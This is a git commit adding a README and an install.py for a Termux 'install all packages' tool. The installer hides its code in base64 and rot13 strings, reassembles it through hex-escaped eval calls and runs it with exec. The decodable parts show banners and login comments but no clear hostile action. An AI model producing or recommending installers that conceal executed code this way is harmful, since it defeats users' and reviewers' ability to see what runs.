15cb55941633712ec4e4f932501a9e554dcfcf85
Mr.X <145559729+Whomrx666@users.noreply.github.com>
2023-11-11 12:08:16 +0700

    allpackagetermux

---
+++ README.md
@@ -0,0 +1,24 @@
+# all-pkg-termux
+![Xdorking preview](all-pkg-termux.png)
+
+## introduction
+This is a tool for installing all packages in Termux and is very useful for those of you who are just using Termux
+
+## Instalations
+```
+$ pkg update && pkg upgrade
+$ pkg install bash
+$ pkg install python3
+$ pkg install git
+$ git clone https://github.com/Whomrx666/all-pkg-termux
+$ cd all-pkg-termux
+$ python3 install.py
+```
+
+## Instructions
+- **for using**Follow the installation method as above and the script will automatically install all packages in Termux
+
+### Original Author
+<a href="https://github.com/Whomrx666"><img src="https://img.shields.io/badge/Original-Author-brightgreen.svg" alt=""/></a>
+
+Follow me: [Whatsapp](https://wa.me/6287855190571),[Youtube](https://youtube.com/@whomrx666),[Tiktok](https://www.tiktok.com/@whomr.x),[Telegram](https://www.tiktok.com/@whomr.x),[Telegram](https://t.me/@Whomr_X),&[Website](https://whomrxhackers.blogspot.com/)
---
+++ install.py
@@ -0,0 +1,12 @@
+# script original by https://github.com/Whomrx666 
+# script version 3 
+# dont remove author pliss bro
+
+import base64, codecs
+magic = 'IyEvdXNyL2Jpbi9weXRob24KIyBDUkVBVEUgQlkgRkVSWgppbXBvcnQgb3MKaW1wb3J0IHRpbWUKaW1wb3J0IHN5cwojRE9OVCBSRU1PVkUgQ09MT1IgVkFSSUFCTEUKQmw9J1wwMzNbMzBtJyAKUmU9J1wwMzNbMTszMW0nCkdyPSdcMDMzWzE7MzJtJwpZZT0nXDAzM1sxOzMzbScKQmx1PSdcMDMzWzE7MzRtJwpNYWdlPSdcMDMzWzE7MzVtJwpDeT0nXDAzM1sxOzM2bScKV2g9J1'
+love = 'jjZmAoZGfmA20aPvAJLKWcLJWfMFOIp2IlozSgMFOCqT9gLKEcplOQMJfXqKAypz5uoJHtCFOipl5aMKEfo2qcovtcPvAJLKWcLJWfMFOZo2SxnJ5aVNcxMJLtoT9uMTyhMltcBtbtVPNtMz9lVTxtnJ4tpzShM2HbZwNcBtbtVPNtVPNtVUA5pl5mqTEiqKDhq3WcqTHbW1klWlxXVPNtVPNtVPOmrKZhp3Exo3I0YaqlnKEyXPWoWF0lZUAqVPIxWFHvVPHtXPp9WlccYPN1XzxcXDbt'
+god = 'ICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgIHRpbWUuc2xlZXAoMC4yMCkKbG9hZGluZygpCiN2YXJpYWJsZSBEaWFhdGFzIFVzZXJuYW1lIGRhbiBQYXNzd29yZApvcy5zeXN0ZW0oImNsZWFyIikKb3Muc3lzdGVtKCJmaWdsZXQgLWYgZnV0dXJlIEFMTCBQQUNLQUdFIFRFUk1VWCBJTlNUQUxMRVIgfCBsb2xjYXQiKQojTG9naW4gVmFyaWFibGUgQWRkIEJZIEZlcn'
+destiny = 'bXpUWcoaDbMvWpZQZmJmR7ZmEgIKAypz5uoJHtDJ5xLGbtr3ImMKWhLJ1ysFVcPaOup3A3o3WxVQ0tnJ5jqKDbVyjjZmAoZGfmAT1DLKAmq29lMPOOozEuBvNvXDcipl5mrKA0MJ0bVaAfMJIjVQZvXDcipl5mrKA0MJ0bVzAfMJSlVvxXo3Zhp3ymqTIgXPWznJqfMKDtYJLtMaI0qKWyVRECI05ZG0SRFH5UVUjtoT9fL2S0VvxXo3Zhp3ymqTIgXPWvLKAbVT1iMUIfMF5mnPVcPt=='
+joy = '\x72\x6f\x74\x31\x33'
+trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
+eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
